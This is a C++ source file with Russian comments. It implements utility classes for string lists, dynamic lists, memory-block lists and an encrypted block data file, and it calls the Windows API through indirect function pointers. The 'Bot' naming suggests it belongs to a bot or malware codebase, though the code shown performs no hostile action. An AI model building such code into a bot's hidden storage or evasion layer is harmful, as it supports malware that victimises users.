
#include <windows.h>

#include "BotClasses.h"
#include "wincrypt.h"




//*****************************************************************************
//                              TBotList
//*****************************************************************************
TBotList::TBotList()
	: TCustomList()
{
	OnDelete = NULL;
}

TBotList::~TBotList()
{
	// т.к. особенности языка не позволяют "корректно"
	// вызвать виртуальный метод в деструкторе мы
	// вынуждены сделать очистку списка и в деструкторе потомка
    Clear();
}

void TBotList::DoDelete(void* Item)
{
	if (OnDelete) OnDelete(this, Item);
}




//*****************************************************************************
//                              TBotStrings
//*****************************************************************************

void StringsDestroyItem(TBotList*, void* Item)
{
	// Функция уничтожает строку
    delete (string*)Item;
}
//---------------------------------------------------

TBotStrings::TBotStrings()
{
	FItems.OnDelete = StringsDestroyItem;
	ValueDelimeter = "=";
}
//---------------------------------------------------

TBotStrings::~TBotStrings()
{

}
//---------------------------------------------------

int TBotStrings::PutStr(string *Str)
{
	// Фунция вставляет строку
    return FItems.Add(Str);
}
//---------------------------------------------------

int TBotStrings::Add(const char* Value)
{
	return PutStr(new string(Value));
}
//---------------------------------------------------

int  TBotStrings::Add(const string& Value)
{
	return PutStr(new string(Value));
}
//---------------------------------------------------

string TBotStrings::MakeValueString(const char* Name, const char* Value)
{
	// Функция собирает строку Имя=Значение
	DWORD Len = STRA::Length(Name) + ValueDelimeter.Length() + STRA::Length(Value);

	string Line(Len);
	Line += Name;
	Line += ValueDelimeter;
	Line += Value;
	return Line;
}
//---------------------------------------------------

int TBotStrings::AddValue(const char* Name, const char* Value)
{
	// Функция добавляет значение в список
	if (STRA::IsEmpty(Name))
		return -1;

	return Add(MakeValueString(Name, Value));
}
//---------------------------------------------------

int TBotStrings::AddValue(const char* Name, const string &Value)
{
    return AddValue(Name, Value.t_str());
}
//---------------------------------------------------

int TBotStrings::AddValue(const string &Name, const string &Value)
{
	return AddValue(Name.t_str(), Value.t_str());
}
//---------------------------------------------------

int TBotStrings::Count()
{
	return FItems.Count();
}
//---------------------------------------------------

void TBotStrings::Clear()
{
    FItems.Clear();
}
//---------------------------------------------------

void TBotStrings::Delete(int Index)
{
	FItems.Delete(Index);
}
//---------------------------------------------------

int TBotStrings::IndexOf(const char* Str)
{
	int Count = FItems.Count();
	for (int i = 0; i < Count; i++)
	{
		string &S = *(string*)FItems[i];
		if (S == Str)
			return i;
	}
	return -1;
}
//---------------------------------------------------

int TBotStrings::IndexOf(const string &Str)
{
	return IndexOf(Str.t_str());
}
//---------------------------------------------------

string TBotStrings::GetItem(int Index)
{
	string Item;

	string* Ptr = (string*)FItems[Index];
	if (Ptr)
		Item = *Ptr;

	return Item;
}
//---------------------------------------------------

void TBotStrings::SetItem(int Index, const char* Item)
{
	if (Index >= 0 && Index < FItems.Count())
		SetItem(Index, string(Item));
}

void TBotStrings::SetItem(int Index, const string &Item)
{
	if (Index >= 0 && Index < FItems.Count())
	{
		string &S = *(string*)FItems[Index];
		S = Item;
    }
}
//---------------------------------------------------

string TBotStrings::GetDelimetedText(const  char* Delimeter)
{
	// Функция собирает все эементы списка в строку
	if (Count() == 0) return NULLSTR;

	string D = Delimeter;

	// Расчитываем общую длину строки
	DWORD Len = 0;
	int Count = FItems.Count();
	for (int i = 0; i < Count; i++)
	{
		string *S = (string*)FItems[i];
		Len += S->Length();
		// для всех строк, кроме последней добавляем символы перевода и
		// новой строки
		if (i < Count - 1)
			Len += D.Length();
	}

	string Result(Len);

	// Собираем строки
	for (int i = 0; i < Count; i++)
	{
		string *S = (string*)FItems[i];
		Result += *S;
		if (i < Count - 1)
			Result += D;
	}

	return Result;
}
//---------------------------------------------------

string TBotStrings::GetText()
{
	return GetDelimetedText("\r\n");
}
//---------------------------------------------------

void TBotStrings::SetText(const char* Text)
{
	// функция разбивает многострочный текст на
	// список строк
	Clear();
	if (STRA::IsEmpty(Text)) return;


	PCHAR Start = (PCHAR)Text;
	PCHAR End;
	PCHAR Line;
	BYTE Flag;
	BYTE Ign;
	DWORD StrLen;
	while (1)
	{
		// Ищем конец строки
		End = Start;
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// Добавляем строку
		if (End != Text)
		{
			StrLen = End - Start;
			Line = (StrLen) ? Start : NULL;
			PutStr(new string(Line, StrLen));
        }

        if (*End == 0) break;

		// Переходим на следующую строку
		Flag = 0;
		while (*End != 0)
		{
			if (*End == 10)
				Ign = 1;
			else
			if (*End == 13)
				Ign = 2;
			else
				break;
			if ((Flag & Ign) != 0)
				break;

			Flag |= Ign;

			End++;
		}
		Start = End;
	}
		
}
//---------------------------------------------------

void TBotStrings::SetText(const string &Text)
{
	SetText(Text.t_str());
}
//---------------------------------------------------

void TBotStrings::SetDelimetedText(const char* Text, const char* Delimeter)
{
	Clear();
	if (STRA::IsEmpty(Text) || STRA::IsEmpty(Delimeter))
		return;
	DWORD DLen = STRA::Length(Delimeter);

	while (*Text)
	{
		int Pos = STRA::Pos(Text, Delimeter);
		if (Pos < 0)
		{
			Add(Text);
			return;
		}

		if (Pos > 0)
		{
			// Добавляем элемент
            string Item(Text, Pos);
            Add(Item);
		}

		Text += Pos;
        Text += DLen;
	}


}
//---------------------------------------------------

string TBotStrings::NameByIndex(int Index)
{
	// Функция возвращает имя из строки с индексом
	string Name;

	DWORD Len = 0;

    string S = GetItem(Index);
	if (IsName(S, &Len, NULL))
	{
        Name.Copy(S, 0, Len);
    }


    return Name;
}
//---------------------------------------------------

string TBotStrings::ValueByIndex(int Index)
{
	// Функция возвращает значение из строки с
	// указанным индексом

	string Value;

	DWORD Start = 0;
	string S = GetItem(Index);

	if (IsName(S, NULL, &Start))
	{
        Value.Copy(S, Start, S.Length() - Start);
    }

	return Value;
}
//---------------------------------------------------

bool TBotStrings::IsName(const string& S, DWORD* NameEnd, DWORD* ValueStart)
{
	// Функция возвращает истину если строка является
	// парой Имя Значение

	if (S.IsEmpty() || ValueDelimeter.IsEmpty())
		return false;

	int Pos = S.Pos(ValueDelimeter);
	bool IsName = Pos >= 0;

	if (IsName)
	{
		if (NameEnd)
			*NameEnd = Pos;
		if (ValueStart)
			*ValueStart = Pos + ValueDelimeter.Length();
    }

	return IsName;
}
//---------------------------------------------------

int TBotStrings::SearchName(const char* Name, string* Value)
{
	// Функция ищет пизоцию элемента с именем Name;
	if (STRA::IsEmpty(Name)) return -1;

	for (int i = 0; i < FItems.Count(); i++)
	{
		string S = GetItem(i);
		DWORD NamePos  = 0;
		DWORD ValuePos = 0;
		if (!IsName(S, &NamePos, &ValuePos)) continue;

		if (STRA::CompareEx(S.t_str(), Name, NamePos) == 0)
		{
			if (Value)
				Value->Copy(S, ValuePos, S.Length() - ValuePos);
            return i;
		}
	}

	return -1;

}
//---------------------------------------------------

string TBotStrings::GetValue(const char* Name)
{
	// Функция возвращает значения для элемента
	// с указанным именем

    string Value;

	SearchName(Name, &Value);

	return Value;
}
//---------------------------------------------------

void TBotStrings::SetValue(const char* Name, const char* Value)
{
	// Функция устанавливает значение для указанного имени
	if (STRA::IsEmpty(Name))
		return;
	int Pos = SearchName(Name, NULL);
	if (Pos < 0)
		AddValue(Name, Value);
	else
		SetItem(Pos, MakeValueString(Name, Value));
}
//---------------------------------------------------

void TBotStrings::SaveToStream(TBotStream* Stream)
{
	// етод записывает набор строк в поток данных
	if (Stream)
	{
		string Buf = GetText();
		Stream->Write(Buf.t_str(), Buf.Length());
    }
}
//---------------------------------------------------

void TBotStrings::LoadFromStream(TBotStream* Stream)
{
	// Функция загружает строки из потока данных
	Clear();
	if (Stream)
	{
		string Buf = Stream->ReadToString();
		SetText(Buf);
    }
}
//---------------------------------------------------


/*----------------  Методы для работы со списками элементов -----------------*/

DWORD MaxListSize = 4000000;

typedef struct TListRec
{
	PDWORD Items;    // Массив элементов
	DWORD Count;     // Количество элементов в списке
	DWORD Capacity;  // Количество зарезервированных элементов
	TFreeItemMethod FreeMethod; // Метод уничтожения элементов

} *PListRec;


PList List::Create()
{
	// Функция создания списка
	PListRec Result = CreateStruct(TListRec);
	SetCapacity(Result, 32);
	return (PList)Result;
}
//----------------------------------------------------------------------------


void List::Free(PList List)
{
    // Функция уничтожения списка
 if (List == NULL)
		return;

	List::Clear(List);
	FreeStruct(List);
}
//----------------------------------------------------------------------------

void List::Clear(PList List)
{
	// Функция очистки списка
	if (List == NULL)
		return;
	PListRec LR = (PListRec)List;

	// Уничтожаем элементы
	if (LR->FreeMethod != NULL)
	{
		DWORD i;
		LPVOID Item;
		for (i = 0; i < LR->Count; i++)
		{
			Item = (LPVOID)LR->Items[i];
			if (Item != NULL)
                LR->FreeMethod(Item);
		}
	}
    // Очищаем список
	HEAP::Free(LR->Items);
	LR->Items = NULL;
	LR->Capacity = 0;
	LR->Count = 0;
}
//----------------------------------------------------------------------------

DWORD List::Count(PList List)
{
	// Функция возвращает количество элементов списка
	if (List == NULL)
		return 0;
	else
		return ((PListRec)List)->Count;

}
//----------------------------------------------------------------------------

bool ListUpdateCapacity(PListRec List)
{
	// Изменить размер выделенной памяти

	// Расчитываем константу увеличения буфера
	DWORD Delta;
	if (List->Capacity > 64)
		Delta = List->Capacity / 4;
	else
	if (List->Capacity > 8)
		Delta = 16;
	else
		Delta = 4;

	// Устанавливаем новый размер
    return List::SetCapacity((PList)List, List->Capacity + Delta);
}
//----------------------------------------------------------------------------

bool List::SetCapacity(PList List, DWORD Value)
{
	// Изменить размер зарегистрированных элементов
	if (List == NULL || Value > MaxListSize)
		return false;

	PListRec LR = (PListRec)List;
	if (Value > LR->Count && Value != LR->Capacity)
	{
        // Создаём новый буфер
		if (HEAP::ReAlloc2((LPVOID &)LR->Items, Value * sizeof(LPVOID)))
		{
			LR->Capacity = Value;
			return true;
        }
	}
	return false;
}
//----------------------------------------------------------------------------

int List::Add(PList List, LPVOID Item)
{
	// Функция добавляет новый элемент
	if (List == NULL)
		return -1;
	PListRec LR = (PListRec)List;

	if (LR->Count == LR->Capacity)
		if (!ListUpdateCapacity(LR))
			return -1;

	DWORD Result = LR->Count;
	LR->Count++;
	LR->Items[Result] = (DWORD)Item;
	return Result;
}
//----------------------------------------------------------------------------

void List::Delete(PList List, DWORD Index)
{
	// Функция удаляет элемент из списка
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return;

	PListRec LR = (PListRec)List;
    LPVOID Temp = (LPVOID)LR->Items[Index];

	LR->Count--;
	if (Index < LR->Count)
	{
		// Переносим блок памяти находящийся за удалённым элементом
		PDWORD Dest = LR->Items;
		Dest += Index;
		PDWORD Source = Dest;
		Source++;
        m_memcpy(Dest, Source, (LR->Count - Index)*sizeof(PDWORD));
	}
	// При необходимости уничтожаем элемент
	if (Temp != NULL && LR->FreeMethod != NULL)
		LR->FreeMethod(Temp);

}
//----------------------------------------------------------------------------

// Извлечь элемент
 LPVOID List::Extract(PList List, DWORD Index)
 {
	// Функция  извлекает элемент из списка не уничтожая его
    PListRec LR = (PListRec)List;
	if (List == NULL || Index >= LR->Count)
		return NULL;

	LPVOID Temp = (LPVOID)LR->Items[Index];
	LR->Items[Index] = 0;
	Delete(List, Index);
	return Temp;
 }

//----------------------------------------------------------------------------

int List::Remove(PList List, LPVOID Item)
{
	// Извлечь из списка элемент
	int Index = IndexOf(List, Item);
	if (Index >= 0)
		Delete(List, Index);
    return Index;
}
//----------------------------------------------------------------------------

int List::IndexOf(PList List, LPVOID Item)
{
	// Функция возвращает позицию элемента в списке
	if (List == NULL)
		return -1;

    PListRec LR = (PListRec)List;
	DWORD Index;
	for (Index = 0; Index < LR->Count; Index++)
		if ((LPVOID)LR->Items[Index] == Item)
			return Index;
	return -1;
}
//----------------------------------------------------------------------------


void List::SetItem(PList List, DWORD Index, LPVOID Item)
{
	// Функция устанавливает значение элементу ы указанной позиции Index
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return;
    PListRec LR = (PListRec)List;

	LPVOID Old = (LPVOID)LR->Items[Index];
	LR->Items[Index] = (DWORD)Item;
	if (Old != NULL && LR->FreeMethod != NULL)
		LR->FreeMethod(Old);
}
//----------------------------------------------------------------------------

LPVOID List::GetItem(PList List, DWORD Index)
{
	// Функция возвращает значение элемента из позиции Index
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return NULL;

    return (LPVOID)((PListRec)List)->Items[Index];
}
//----------------------------------------------------------------------------

void List::SetFreeItemMehod(PList List, TFreeItemMethod Method)
{
	// Установить метод автоматического удаления элементов
	if (List != NULL)
		((PListRec)List)->FreeMethod = Method;
}
//----------------------------------------------------------------------------

LPVOID List::Last(PList List)
{
	// функция возвращает последний элемент списка
	if (List == NULL) return NULL;
    return List::GetItem(List, List::Count(List) - 1);
}
//----------------------------------------------------------------------------

void List::CopyFrom(PList Destination, PList Source)
{
	// Функция копирует элементы из списка Source в список Destination
	if (Destination == NULL || Source == NULL)
		return;

	for (DWORD i = 0; i < Count(Source); i++)
    {
    	Add(Destination, GetItem(Source, i));
	}
}


// ----------------------------------------------------------------------------
//
//  Набор функция для работы со списками строк Strings
//
// ----------------------------------------------------------------------------

typedef struct TStringsRec
{
	PList Items;
	PCHAR LineDelimeter;
	PCHAR ValueDelimeter;

} *PStringsRec;


PStrings Strings::Create()
{
	// Создать набор строк
	PStringsRec Rec = CreateStruct(TStringsRec);

	Rec->Items = List::Create();
	List::SetFreeItemMehod(Rec->Items, (TFreeItemMethod)STR::Free);

	Rec->LineDelimeter = STR::New("\r\n");
	Rec->ValueDelimeter = STR::New("=");

	return (PStrings)Rec;
}
// ----------------------------------------------------------------------------

void Strings::Free(PStrings Strings)
{
	// Уничтожить набор строк
	if (Strings == NULL)
		return;

	List::Free(PStringsRec(Strings)->Items);
	STR::Free(PStringsRec(Strings)->LineDelimeter);
	STR::Free(PStringsRec(Strings)->ValueDelimeter);

	FreeStruct(Strings);
}
// ----------------------------------------------------------------------------

void Strings::Clear(PStrings Strings)
{
	// Очистить набор строк
	if (Strings != NULL)
		List::Clear(PStringsRec(Strings)->Items);
}
// ----------------------------------------------------------------------------

DWORD Strings::Count(PStrings Strings)
{
	// Получить количество строк
	if (Strings == NULL)
		return 0;
	return List::Count(PStringsRec(Strings)->Items);
}
// ----------------------------------------------------------------------------

int Strings::Add(PStrings Strings, PCHAR Str, bool Duplicate)
{
	// Добавить новую строку
	if (Strings == NULL)
		return -1;
	PCHAR Tmp;
	if (Duplicate)
		Tmp = STR::New(Str);
	else
		Tmp = Str;
	return List::Add(PStringsRec(Strings)->Items, (LPVOID)Tmp);
}
// ----------------------------------------------------------------------------

void Strings::Delete(PStrings Strings, DWORD Index)
{
	// Удалить строку
	if (Strings == NULL)
		return;

	List::Delete(PStringsRec(Strings)->Items, Index);
}
// ----------------------------------------------------------------------------

int Strings::Remove(PStrings Strings, PCHAR Str)
{
	// Функция удаляет строку Str из списка
	int Index = IndexOf(Strings, Str);
	if (Index >= 0)
		Delete(Strings, Index);
	return Index;
}
// ----------------------------------------------------------------------------

int Strings::IndexOf(PStrings Strings, PCHAR Str)
{
    // Функция возвращает позицию строки Str в списке
	if (Strings == NULL) return -1;
	PStringsRec R = (PStringsRec)Strings;

	int Count = List::Count(R->Items);

	for (int i = 0; i < Count; i++)
	{
		PCHAR S = (PCHAR)List::GetItem(R->Items, i);
		if (StrSame(S, Str, true))
        	return i;
	}
	return -1;
}
// ----------------------------------------------------------------------------

PCHAR Strings::GetItem(PStrings Strings, DWORD Index, bool DuplicateStr)
{
	// Получит строку из позиции

	if (Strings == NULL)
		return NULL;
	PCHAR Str = (PCHAR)List::GetItem(PStringsRec(Strings)->Items, Index);
	if (DuplicateStr)
		return STR::New(Str);
	else
		return Str;
}
// ----------------------------------------------------------------------------

PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
{
	// Объеденяет все строки в одну. Если не указан
	// разделитель то использован разделитель заданный в настройках
	if (Strings == NULL)
		return NULL;

	PStringsRec SR = (PStringsRec)Strings;

	DWORD Count = List::Count(SR->Items);
	if (Count == 0)
		return NULL;

	// Инициализируем разделитель строк
	PCHAR Del;
	DWORD DelLen;

	if (LineDelimeter != NULL)
	{
		Del = LineDelimeter;
		DelLen = StrCalcLength(Del);
	}
	else
	{
		Del = SR->LineDelimeter;
		DelLen = STR::Length(Del);
	}

	PCHAR S;
	DWORD TotalLen = 0;
	DWORD i;

	// Рсчитываем длину строки
	for (i = 0; i < Count; i++)
	{
		S = (PCHAR)List::GetItem(SR->Items, i);
		TotalLen += STR::Length(S);
		if (i < (Count - 1))
			TotalLen += DelLen;
	}

	// Собираем строку
	DWORD L;
	PCHAR Result = STR::Alloc(TotalLen);

	PCHAR Temp = Result;

	for (i = 0; i < Count; i++)
	{
		S = (PCHAR)List::GetItem(SR->Items, i);
		L = STR::Length(S);

		m_memcpy(Temp, S, L);
		Temp += L;

		if (i < (Count - 1))
		{
			m_memcpy(Temp, Del, DelLen);
			Temp += DelLen;
		}
	}

	return Result;
}

//----------------------------------------------------------------------------

void Strings::SetText(PStrings Strings, PCHAR Text)
{
	// Функция разбирает текст на строки разделённые символами новой
	// строки и перевода каретки

	if (Strings == NULL || Text == NULL)
		return;
	PStringsRec SR = (PStringsRec)Strings;
	// очищаем список
	List::Clear(SR->Items);

	//Парсим текст
	PCHAR Start = Text;
	PCHAR End;
	PCHAR Line;
	BYTE Flag;
	BYTE Ign;
	DWORD StrLen;
	while (*Start != 0)
	{
		// Ищем конец строки
		End = Start;
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// Создаём строку
		StrLen = End - Start;
		if (StrLen != 0)
			Line = STR::New(Start, StrLen);
		else
			Line = NULL;
		List::Add(SR->Items, Line);

		// Переходим на следующую строку
		Flag = 0;
		while (*End != 0)
		{
			if (*End == 10)
				Ign = 1;
			else
			if (*End == 13)
				Ign = 2;
			else
				break;
			if ((Flag & Ign) != 0)
				break;

			Flag = Flag | Ign;

			End++;
		}
		Start = End;
	}
}
//----------------------------------------------------------------------------

int Strings::AddValue(PStrings Strings, PCHAR Name, PCHAR Value, PCHAR Delimeter)
{
	// Добавить в список пару Имя=Значение.
	// Если не указан разделитель то будет взят из настроек списка (по умолчанию =)

	if (Strings == NULL || Name == NULL)
		return NULL;

	PStringsRec SR = (PStringsRec)Strings;

	PCHAR Del = Delimeter;
	if (Del == NULL)
		Del = SR->ValueDelimeter;

	return List::Add(SR->Items, STR::New(3, Name, Del, Value));
}




//---------------------------------------------------------------------------
//  MEMBLOCKS - Функции для работы с блоками памяти, списками блоков
//---------------------------------------------------------------------------
PMemBlockList MEMBLOCK::CreateList()
{
	// Создать список блоков
	PMemBlockList List = List::Create();
	List::SetFreeItemMehod(List, (TFreeItemMethod)FreeBlock);
    List::SetCapacity(List, 64);
	return List;
}

void MEMBLOCK::FreeList(PMemBlockList List)
{
	// Уничтожить список блоков
	List::Free(List);
}


void MEMBLOCK::FreeBlock(PMemBlock Block)
{
	// уничтожить блок памяти
	if (Block == NULL) return;
	MemFree(Block->Data);
    FreeStruct(Block);
}

PMemBlock MEMBLOCK::AddBlock(PMemBlockList List, LPVOID Data, DWORD DataSize, bool Copy)
{
    // добавить новый блок в список
	if (List == NULL || Data == NULL || DataSize == 0)
		return NULL;

	PMemBlock Block = CreateStruct(TMemBlock);
	if (Block == NULL) return NULL;

	if (Copy)
	{
		Block->Data = MemAlloc(DataSize);
		if (Block->Data == NULL)
		{
			FreeStruct(Block);
			return NULL;
        }
		m_memcpy(Block->Data, Data, DataSize);
	}
	else
		Block->Data = Data;
	Block->Size = DataSize;
	List::Add(List, Block);
	return Block;
}

DWORD MEMBLOCK::Size(PMemBlockList List)
{
	// Функция подсчитывает общий размер данных всех блоков списка
	if (List == NULL) return 0;
	DWORD Sz = 0;
	DWORD Count = List::Count(List);
	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock B = (PMemBlock)List::GetItem(List, i);
        Sz += B->Size;
	}
    return Sz;
}

void MEMBLOCK::BuildToBuf(PMemBlockList List, LPVOID Buf)
{
	// Функция копирует данные всех блоков в буфер Buf.
	// Подразумевается, что Buf может уместить в себе все блоки
    if (List == NULL || Buf == NULL) return;

	DWORD Count = List::Count(List);
	if (Count == 0) return;

	PCHAR Temp = (PCHAR)Buf;

	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(List, i);
		m_memcpy(Temp, Block->Data, Block->Size);
		Temp += Block->Size;
	}
}


PCHAR MEMBLOCK::BuildAsStr(PMemBlockList List, DWORD *TotalSize)
{
	// Функция собирает все блоки в строку
	DWORD StrSize = Size(List);
	if (TotalSize != NULL)
		*TotalSize = StrSize;
	if (StrSize == 0) return NULL;

	PCHAR Str = STR::Alloc(StrSize);
    BuildToBuf(List, Str);
    return Str;
}

// Функция собирает все блоки в строку
LPVOID MEMBLOCK::BuildAsMem(PMemBlockList List, DWORD *TotalSize)
{
	DWORD BufSize = Size(List);
	if (TotalSize != NULL)
		*TotalSize = BufSize;
	if (BufSize == 0) return NULL;

	// Для совместимости с функциями обработуи строк в конец буфера запишем
	// ограничивающий ноль
	LPVOID Buf = MemAlloc(BufSize + 1);
	BuildToBuf(List, Buf);
	*((PCHAR)Buf + BufSize) = 0;
	return Buf;
}


PMemBlock MEMBLOCK::Pack(PMemBlockList List)
{
	// Функция объеденяет блоки в один
	DWORD Count = List::Count(List);
	if (Count == 0) return NULL;

	if (Count > 1)
	{
		DWORD Size = 0;
		LPVOID Mem = BuildAsMem(List, &Size);
		List::Clear(List);
        MEMBLOCK::AddBlock(List, Mem, Size, false);
	}
	return (PMemBlock)List::GetItem(List, 0);
}

PMemBlock MEMBLOCK::GetBlockByID(PMemBlockList List, DWORD ID)
{
	// Получить блок по идентификатору
	if (List == NULL)
		return NULL;

	for (DWORD i = 0; i < List::Count(List); i++)
    {
		PMemBlock Block = (PMemBlock)List::GetItem(List, i);
		if (Block == NULL)
			continue;
		if (Block->ID == ID)
			return Block;
	}

	return NULL;
}

PCHAR MEMBLOCK::GetBlockByAsStr(PMemBlockList List, DWORD ID)
{
	// Получить блок как строку
	PMemBlock Block = GetBlockByID(List, ID);
	if (Block != NULL)
		return STR::New((PCHAR)Block->Data, Block->Size);
	else
		return NULL;
}

bool MEMBLOCK::ContainBlock(PMemBlockList List, DWORD ID)
{
	// Функция вернёт истину если в списке есть блок с указанным идентификатором
	return GetBlockByID(List, ID) != NULL;
}

//---------------------------------------------------------------------------
//  DataFile - методы для работы с файлами данными
//---------------------------------------------------------------------------

#pragma pack(push, 1)
// Заголовок блока данных
typedef struct TDataBlockHead
{
	DWORD Signature;
	DWORD ID;
	DWORD Size;
}*PDataBlockHead;
#pragma pack(pop)

// Случайное число, сигнатура блока данных
#define DATA_BLOCK_SIGNATURE  0x40F714CE



PDataFile DataFile::CreateDataFile(PCHAR FileName, DWORD Signature)
{
	// Функция создаёт файл с именем FileName, создаёт структуру описания
	// файла но при этом ничего в файл не записывает
	HANDLE File	= (HANDLE)::pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (File == INVALID_HANDLE_VALUE)
		return NULL;

	PDataFile Rec = CreateStruct(TDataFileRec);
	if (Rec == NULL)
	{
		pCloseHandle(File);
		return NULL;
	}

	// Инициализируем структуру файла
    Rec->FileName = STR::New(FileName);
	Rec->Handle = File;
    Rec->Blocks = MEMBLOCK::CreateList();

	Rec->Head.Signature = Signature;
	Rec->Head.Version   = DATA_FILE_VERSION;

	return Rec;
}

PDataFile DataFile::OpenFile(PCHAR FileName, DWORD Signature)
{
	// Функция открывает файл для чтения и читает из него заголовок
	HANDLE Handle	= (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (Handle == INVALID_HANDLE_VALUE)
		return NULL;

	PDataFile File = CreateStruct(TDataFileRec);
	if (File == NULL)
	{
		pCloseHandle(Handle);
		return NULL;
	}

    File->Handle = Handle;

	// Читаем заголовок файла
	DWORD Readed = 0;
	pReadFile(Handle, &File->Head, sizeof(File->Head), &Readed, NULL);
	if (Readed != sizeof(File->Head) ||
		File->Head.Version > DATA_FILE_VERSION ||
		(Signature != 0 && File->Head.Signature != Signature))
	{
		pCloseHandle(Handle);
		FreeStruct(File);
		return NULL;
	}

	return File;
}

void DataFile::CloseFile(PDataFile File)
{
	// Функция закрывает файл и уничтожает структуру File
	if (File == NULL) return;

	if (File->Handle != NULL)
		pCloseHandle(File->Handle);

    STR::Free(File->FileName);

	// Освобождаем данные структуры
	MEMBLOCK::FreeList(File->Blocks);
    FreeStruct(File);
}

bool DataFile::WriteDataFile(PDataFile File)
{
	// Записывает данные из структуры File в физический файл
	if (File == NULL || File->Handle == NULL) return false;

	DWORD Size = sizeof(File->Head);
	DWORD Written = 0;
	pWriteFile(File->Handle, &File->Head, Size, &Written, NULL);
	if (Written != Size) return false;

	return WriteBlocksToFile(File);
}

// Читает данные из физического файла в структуру File
bool DataFile::ReadDataFile(PDataFile File)
{
	// Читаем блоки данных
	if (File == NULL || File->Handle == NULL)
		return false;

	return !ReadBlocksFromFile(File);
}


void DataFile::AddDataBlock(PDataFile File, DWORD BlockID, LPVOID Data, DWORD DataSize, bool Copy)
{
	// Добавить блок данных
	if (File == NULL) return;

	// Для добавления блока данных не будем пользоваться методом
	// MEMBLOCK::AddBlock так как он игнорирует пустые блоки, а нам
	// в любом случае нужно их записывать

	PMemBlock Block = CreateStruct(TMemBlock);
	if (Block == NULL) return;
	Block->ID = BlockID;
	Block->Size = DataSize;

	if (Copy)
	{
		Block->Data = MemAlloc(DataSize);
		if (Block->Data == NULL)
		{
			FreeStruct(Block);
			return;
        }
		m_memcpy(Block->Data, Data, DataSize);
	}
	else
		Block->Data = Data;

    List::Add(File->Blocks, Block);
}

void DataFile::AddDataBlock(PDataFile File, DWORD BlockID, PCHAR StrData)
{
	DWORD Size = StrCalcLength(StrData);
    AddDataBlock(File, BlockID, StrData, Size, true);
}



LPVOID CryptBlockData(PMemBlock Block, LPVOID Key, TCryptMethod Method, PDWORD OutSize)
{
	// Зашифровать блок данных, функция дублирует данные перед копированием
	if (Block == NULL || Block->Size == 0 || Block->Data == NULL ||
		Key == NULL || Method == NULL)
		return NULL;

	LPVOID NewBuf = MemAlloc(Block->Size);
	if (NewBuf == NULL) return NULL;

    *OutSize = Block->Size;
	m_memcpy(NewBuf, Block->Data, Block->Size);
	if (!Method(Key, (LPBYTE)NewBuf, Block->Size, OutSize))
	{
		MemFree(NewBuf);
		NewBuf = NULL;
    }
	return NewBuf;
}

bool DataFile::WriteBlocksToFile(PDataFile File)
{
	// Записать блоки данных ф файл
	if (File == NULL || File->Handle == NULL) return false;

	// Записываем блоки данных в файл
	DWORD Count = List::Count(File->Blocks);

	TDataBlockHead BH;
	BH.Signature = DATA_BLOCK_SIGNATURE;

	DWORD WriteSize;
	DWORD WrittenSize;
	LPVOID Buf;
	bool FreeBuf;

    bool Result = true;

	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(File->Blocks, i);
		if (Block == NULL) continue;

		// Инициализируем заголовок
		BH.ID   = Block->ID;
		BH.Size = Block->Size;

		// Записываем заголовок
		WriteSize = sizeof(BH);
		pWriteFile(File->Handle, &BH, WriteSize, &WrittenSize, NULL);
		if (WriteSize != WrittenSize)
		{
			Result = false;
			break;
		}

		// Записываем данные
		FreeBuf = false;
		Buf = NULL;
		WriteSize = BH.Size;

		if (File->CryptMode == fcBlock)
			Buf = CryptBlockData(Block, File->CryptKey, File->CryptMethod, &WriteSize);

		if (Buf != NULL)
			FreeBuf = true;
		else
			Buf =  Block->Data;


		pWriteFile(File->Handle, Buf, WriteSize, &WrittenSize, NULL);

		if (FreeBuf)
			MemFree(Buf);

		if (WriteSize != WrittenSize)
		{
			Result = false;
			break;
		}
	}
	return Result;
}


bool DataFile::ReadBlocksFromFile(PDataFile File)
{
	// Записать блоки данных ф файл
	if (File == NULL || File->Handle == NULL)
		return false;

	if (File->Blocks == NULL)
		File->Blocks = MEMBLOCK::CreateList();

	bool Error = false;
	DWORD Size;
	DWORD Readed;
    TDataBlockHead BH;
	while (1)
	{
		// Читаем заголовок блока
		Size =sizeof(BH);
		pReadFile(File->Handle, &BH, Size, &Readed, NULL);
		if (Readed != Size || BH.Signature != DATA_BLOCK_SIGNATURE)
		{
			Error = Readed != 0 || BH.Signature != DATA_BLOCK_SIGNATURE;
            break;
		}

		// Читаем данные
		if (BH.Size != 0)
		{
			LPVOID Buf = MemAlloc(BH.Size);
			if (Buf == NULL)
			{
				Error = true;
				break;
			}

			pReadFile(File->Handle, Buf, BH.Size, &Readed, NULL);
			if (Readed != BH.Size)
			{
				MemFree(Buf);
				Error = true;
				break;
			}

			// Расшифровываем данные
			if (File->CryptMode == fcBlock && File->DecryptMethod != NULL)
				if (!File->DecryptMethod(File->CryptKey, (LPBYTE)Buf, BH.Size, &BH.Size))
				{
					MemFree(Buf);
					Error = true;
					break;
                }


			AddDataBlock(File, BH.ID, Buf, BH.Size, false);
		}
	}

	// В случае ошибки чтения очищаем список
	if (Error)
		List::Clear(File->Blocks);

    return !Error;
}

bool DataFile::CryptBlocks(PMemBlockList Blocks, LPVOID Key, TCryptMethod Method)
{
	// Зашифровать блоки данных
	if (Blocks == NULL || Key == NULL || Method == NULL)
		return false;

	DWORD Count = List::Count(Blocks);
	for (DWORD i = 0; i < Count; i++)
    {
		PMemBlock Block = (PMemBlock)List::GetItem(Blocks, i);
		if (Block->Size == 0 || Block->Data == NULL) continue;

		if (!Method(Key, (LPBYTE)Block->Data, Block->Size, &Block->Size))
			return false;
	}
    return true;
}


//*****************************************************************************
//                        TEventContainer
//*****************************************************************************

 TEventContainer::TEventContainer()
 {
	FEvents = NULL;
    pInitializeCriticalSection(&FLock);
 }

